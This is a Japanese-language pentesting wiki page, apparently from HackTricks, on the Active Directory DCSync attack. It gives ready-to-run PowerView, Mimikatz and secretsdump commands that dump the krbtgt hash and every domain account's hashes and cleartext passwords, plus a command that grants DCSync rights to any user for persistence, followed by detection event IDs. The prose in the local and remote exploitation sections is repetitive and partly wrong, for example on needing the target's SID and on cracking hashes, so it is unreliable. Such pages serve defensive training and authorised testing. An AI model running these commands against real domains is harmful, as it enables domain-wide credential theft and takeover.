# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか、またはHackTricksをPDFでダウンロードしたいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>

## DCSync

**DCSync**権限は、ドメイン自体に対して次の権限を持つことを意味します：**DS-Replication-Get-Changes**、**Replicating Directory Changes All**、および**Replicating Directory Changes In Filtered Set**。

**DCSyncに関する重要な注意事項：**

* **DCSync攻撃は、ドメインコントローラの動作をシミュレートし、他のドメインコントローラに情報のレプリケーションを要求**します。これは、Active Directoryの有効で必要な機能であるため、オフまたは無効にすることはできません。
* デフォルトでは、**Domain Admins、Enterprise Admins、Administrators、およびDomain Controllers**グループのみが必要な特権を持っています。
* もし、任意のアカウントのパスワードが可逆暗号化で保存されている場合、Mimikatzにはパスワードを平文で返すオプションがあります。

### 列挙

`powerview`を使用してこれらの権限を持つユーザーをチェックします：
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### ローカルでのエクスプロイト

DCSyncは、Active Directory（AD）ドメインコントローラ（DC）からユーザーのハッシュを取得するための攻撃手法です。この攻撃手法を使用すると、攻撃者はドメイン内の任意のユーザーアカウントのハッシュを取得し、そのユーザーの特権を悪用することができます。

DCSync攻撃を実行するためには、攻撃者はドメイン内の有効なユーザーアカウントを持つ必要があります。攻撃者は、攻撃対象のドメインコントローラに対して認証を行い、その後、攻撃者が指定したユーザーアカウントのハッシュを取得するための特権を取得します。

以下の手順に従って、DCSync攻撃をローカルで実行することができます。

1. 攻撃者は攻撃対象のドメインコントローラに対して認証を行います。これには、攻撃者が有効なユーザーアカウントを持っている必要があります。

2. 攻撃者は攻撃対象のドメインコントローラに対して、DCSync攻撃を実行するための特権を取得します。これには、攻撃者がドメイン管理者の特権を持っている必要があります。

3. 攻撃者は攻撃対象のユーザーアカウントのハッシュを取得します。これには、攻撃者が攻撃対象のユーザーアカウントのSID（セキュリティ識別子）を知っている必要があります。

4. 攻撃者は取得したハッシュを使用して、攻撃対象のユーザーアカウントの特権を悪用することができます。これには、攻撃者がハッシュを解読し、パスワードを取得する必要があります。

DCSync攻撃は、攻撃者がドメイン内のユーザーアカウントの特権を悪用するための強力な手法です。攻撃者は、この攻撃手法を使用して、ドメイン内の重要な情報にアクセスしたり、攻撃対象のユーザーアカウントを制御したりすることができます。
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### リモートでの攻撃

DCSyncは、Active Directory（AD）ドメインコントローラ（DC）からユーザーのハッシュを取得するための攻撃手法です。この攻撃手法を使用すると、攻撃者はドメイン内のユーザーアカウントのハッシュを取得し、それを使用して認証情報を盗むことができます。

DCSync攻撃を実行するためには、攻撃者はドメイン内の有効なユーザーアカウントを持つ必要があります。攻撃者は、攻撃対象のドメインコントローラに対してリモートで認証を行い、攻撃対象のユーザーアカウントのハッシュを取得します。

以下は、DCSync攻撃を実行するための手順です。

1. 攻撃者は攻撃対象のドメインコントローラに対してリモートで認証を行います。
2. 攻撃者は攻撃対象のユーザーアカウントのSID（セキュリティ識別子）を取得します。
3. 攻撃者はDCSync攻撃を実行するために、攻撃対象のドメインコントローラに対して特権のある操作を要求します。
4. 攻撃者は攻撃対象のユーザーアカウントのハッシュを取得します。
5. 攻撃者は取得したハッシュを使用して、認証情報を盗みます。

DCSync攻撃は、攻撃者がドメイン内のユーザーアカウントのハッシュを取得するための効果的な手法です。攻撃者はこれを利用して、ドメイン内の他のシステムやサービスにアクセスすることができます。
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc`は3つのファイルを生成します：

* NTLMハッシュを含む1つのファイル
* Kerberosキーを含む1つのファイル
* NTDSのクリアテキストパスワードを含む1つのファイル。[**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) \*\*\*\*が有効になっているアカウントのNTDSからクリアテキストパスワードを取得できます。reversible encryptionが有効なユーザーを取得するには、次のコマンドを使用します。

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### 持続性

ドメイン管理者であれば、`powerview`のヘルプを使用して、これらの権限を任意のユーザーに付与することができます。
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
次に、**ユーザーが正しく割り当てられているかどうかを確認**することができます。これらの特権を出力の中から検索して、それらの特権の名前を「ObjectType」フィールドの中に見ることができるはずです。
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### 緩和策

* セキュリティイベントID 4662（オブジェクトの監査ポリシーが有効である必要があります）- オブジェクトに対して操作が実行されました
* セキュリティイベントID 5136（オブジェクトの監査ポリシーが有効である必要があります）- ディレクトリサービスオブジェクトが変更されました
* セキュリティイベントID 4670（オブジェクトの監査ポリシーが有効である必要があります）- オブジェクトのアクセス許可が変更されました
* AD ACLスキャナー - ACLの作成と比較を行い、レポートを作成します。 [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## 参考文献

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化されたワークフローを簡単に構築および自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
